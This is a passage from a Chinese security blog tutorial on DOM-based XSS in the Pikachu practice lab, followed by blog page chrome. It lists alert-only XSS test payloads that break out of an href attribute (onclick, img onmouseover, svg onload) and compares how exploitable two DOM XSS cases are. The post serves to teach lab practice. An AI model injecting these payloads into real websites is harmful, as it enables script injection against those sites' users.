                    //试试：' onclick="alert('xss')">,闭合掉就行
</script></code></pre>
<p>不难发现这个地方存在DOM型XSS。我们输入的东西，经提交过后被window.location.search获取到赋值给变量str，str在将参数传到a标签的herf 属性里面还有url中。这里没有任何安全防范措施。那么，我们就以这为入手点构建闭合的前端代码生成payload。<strong>（ 构建方法在注释里）</strong></p>
<p><strong>下面是测试payload</strong></p>
<pre class=" language-JavaScript"><code class="language-JavaScript">需要点击多次点击触发
#' onclick="alert(/xss/)"

需要点击后鼠标移动到图片上（魔改版）
'><img width="10000px" height="10000px"  src="#" onmouseover="alert('xss')" >

点击后直接触发xss（魔改版）
" '><svg/onload=alert(1)></code></pre>
<h4 id="思考：这两个DOM-XSS-有什么不同"><a href="#思考：这两个DOM-XSS-有什么不同" class="headerlink" title="思考：这两个DOM_XSS 有什么不同"></a>思考：这两个DOM_XSS 有什么不同</h4><p><strong>我们从利用角度来说吧，</strong>第一个DOM_XSS比较鸡肋，虽然你发现了它，但是没有啥鸟用。没法拿着它去进行有效利用。</p>
<p>而第二个就不同了，第二个有点类似反射型XSS(GET)，那我们就可以拿它构造特殊payload进行丰富的XSS攻击。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>各位哥哥，真不是我想水，我在前面写的太详细了，该BB的废话我都说完了，所以这篇我就换了思路方式去写，力争各位哥哥在看完这几篇文章后对XSS有更多的认识。接下来我还会写一篇XSS小进阶，下篇我绝对不会水。我先在这立个flag，，，下篇绝对满满干货，绝对满满干货。（希望各位大佬勿喷，我们下篇有缘再见）</p>
<p><strong>我想说的是</strong>：这篇可能看确实起来过于杂乱无章，摸不着头脑，有些不够详尽。一方面是因为我想前几篇写的很详细，另一方面我想填一下前面几篇的坑。前面几篇力主详细和操作简单化，并未讨论一些深层次的东西。这篇我就想对前面两篇做个扩展，我想更深一层次的带大家去探究XSS利用和提升对XSS认识。</p>
<p><strong>（注：由于我才能不足，这里的探究也是很初级，至于对XSS认识的提升也是对于小白来说的，希望各位大佬勿怪。）</strong></p>
<pre class=" language-PHP"><code class="language-PHP"><?php phpinfo();?></code></pre>

            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        Author:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://Lu-sakura.github.io" rel="external nofollow noreferrer">Lu-sakura</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        Link:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://Lu-sakura.github.io/2020/01/27/pikachu-xss/">https://Lu-sakura.github.io/2020/01/27/pikachu-xss/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        Reprint policy:
                    </i>
                </span>
                <span class="reprint-info">
                    All articles in this blog are used except for special statements
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    reprint polocy. If reproduced, please indicate source
                    <a href="https://Lu-sakura.github.io" target="_blank">Lu-sakura</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/pikachu-XSS/">
                                    <span class="chip bg-color">pikachu_XSS</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">

<div id="article-share">
    
    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>
            
        </div>
    </div>

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
            <div class="card">
                <a href="/2020/01/28/csrf/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="CSRF_水文">
                        
                        <span class="card-title">CSRF_水文</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            CSRF水文说明关于CSRF这个没有太多的问题，漏洞也很好理解成因也很简单，我这里给出几篇文章供你们参考吧。
CSRF漏洞详细说明
安全|常见的Web攻击手段之CSRF攻击
WEB安全之-CSRF（跨站请求伪造）
CSRF( 跨站请求伪造)
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2020-01-28
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Lu-sakura
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CSRF-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5/">
                        <span class="chip bg-color">CSRF_参考链接</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                Next&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2020/01/26/dvwa-dom-xing-xss/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="DOM_XSS_简介">
                        
                        <span class="card-title">DOM_XSS_简介</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            DVWA_DOM 型 XSS什么是DOM_XSS什么是DOMDOM(Document Object Model)即文档对象模型， 定义了访问HTML和XML文档的标准。
DOM 是 W3C（万维网联盟）的标准。DOM 定义了访问 HTML 
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2020-01-26
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Lu-sakura
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/DVWA-XSS-DOM/">
                        <span class="chip bg-color">DVWA_XSS_DOM</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>

    
<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块折行 -->

<style type="text/css">
code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
</style>

    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>



    <footer class="page-footer bg-color">
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            <span id="year">2019</span>
            <a href="https://Lu-sakura.github.io" target="_blank">Lu-sakura</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">36.1k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2019";
                    var startMonth = "6";
                    var startDate = "28";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/Lu-sakura" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1981754466@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1981754466" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1981754466" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
});
</script>
    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Global site tag (gtag.js) - Google Analytics -->


    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    

    

    
    
    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
